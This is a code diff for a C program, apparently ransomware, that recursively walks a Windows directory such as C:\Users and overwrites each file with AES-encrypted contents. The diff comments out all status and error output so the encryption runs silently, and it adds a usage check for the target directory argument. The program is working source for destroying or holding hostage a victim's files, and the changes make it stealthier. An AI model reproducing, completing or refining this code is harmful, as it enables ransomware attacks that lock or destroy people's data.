@@ -30,11 +30,11 @@ BOOL SpiderDirectory(char* cDirectoryName, unsigned char* cEncryptedCode) {
     StringCchCopy(lpPartialDirectory, MAX_PATH, cDirectoryName);
     sprintf(lpFullDirectory, "%s\\\\*", lpPartialDirectory);
 
-    printf("%s Target directory is: %s\n", INFO, cDirectoryName);
+    //printf("%s Target directory is: %s\n", INFO, cDirectoryName);
 
     hFind = FindFirstFileA(lpFullDirectory, &ffd);
     if (hFind == INVALID_HANDLE_VALUE) {
-        printf("%s FindFirstFile failed with error: 0x%x\n", ERROR, GetLastError());
+        //printf("%s FindFirstFile failed with error: 0x%x\n", ERROR, GetLastError());
     }
     do {
         if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
@@ -42,18 +42,18 @@ BOOL SpiderDirectory(char* cDirectoryName, unsigned char* cEncryptedCode) {
                 continue;
             }
             sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);
-            printf("%s   <DIR>\n", lpFullDirectory);
+            //printf("%s   <DIR>\n", lpFullDirectory);
             SpiderDirectory(lpFullDirectory, cEncryptedCode);
         }
         else {
             filesize.LowPart = ffd.nFileSizeLow;
             filesize.HighPart = ffd.nFileSizeHigh;
-            printf("%s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
+            //printf("%s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
             sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);
 
             cEncryptedCode = LoadFile(lpFullDirectory, &file_size);
             code_len = file_size;
-            printf("%s\n", cEncryptedCode);
+            //printf("%s\n", cEncryptedCode);
             cEncryptedCode = AesEncrypt(0, cEncryptedCode, code_len, key, sizeof(key));
             lEncryptedCodeSize = filesize.QuadPart;
             WriteToFile(lpFullDirectory, cEncryptedCode, lEncryptedCodeSize);
@@ -68,7 +68,7 @@ unsigned char* PadData(unsigned char* data, DWORD* data_len) {
     *data_len += pad_len;
     unsigned char* padded_data = (unsigned char*)malloc(*data_len);
     if (padded_data == NULL) {
-        printf("Memory allocation for padding failed with error: 0x%x\n", ERROR, GetLastError());
+        //printf("Memory allocation for padding failed with error: 0x%x\n", ERROR, GetLastError());
         exit(1);
     }
 
@@ -83,22 +83,26 @@ unsigned char* PadData(unsigned char* data, DWORD* data_len) {
 BOOL WriteToFile(LPCSTR lpFileName, unsigned char* cEncryptedCode, long lEncryptedCodeSize) {
     HANDLE hEncryptedFile = NULL;
 
-    printf("%s filename: '%s'\n", INFO, lpFileName);
+    //printf("%s filename: '%s'\n", INFO, lpFileName);
     hEncryptedFile = CreateFileA(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hEncryptedFile == INVALID_HANDLE_VALUE) {
-        printf("%s CreateFile failed with error: 0x%x\n", ERROR, GetLastError());
+        //printf("%s CreateFile failed with error: 0x%x\n", ERROR, GetLastError());
         return -1;
     }
 
     DWORD dwBytesWritten;
-    printf("%s filesize: %d\n", INFO, lEncryptedCodeSize);
+    //printf("%s filesize: %d\n", INFO, lEncryptedCodeSize);
     if (!WriteFile(hEncryptedFile, cEncryptedCode, lEncryptedCodeSize, &dwBytesWritten, NULL)) {
-        printf("%s WriteFile failed with error: 0x%x\n", ERROR, GetLastError());
+        //printf("%s WriteFile failed with error: 0x%x\n", ERROR, GetLastError());
         return 1;
     }
 }
 
 int main(int argc, char* argv[]) {
+    if (argc < 2) {
+        printf("%s <directory>", argv[0]);
+        return 1;
+    }
     //Must be in format C:\\Users
     char* cDirectoryName = argv[1];
     SpiderDirectory(cDirectoryName, cEncryptedCode);
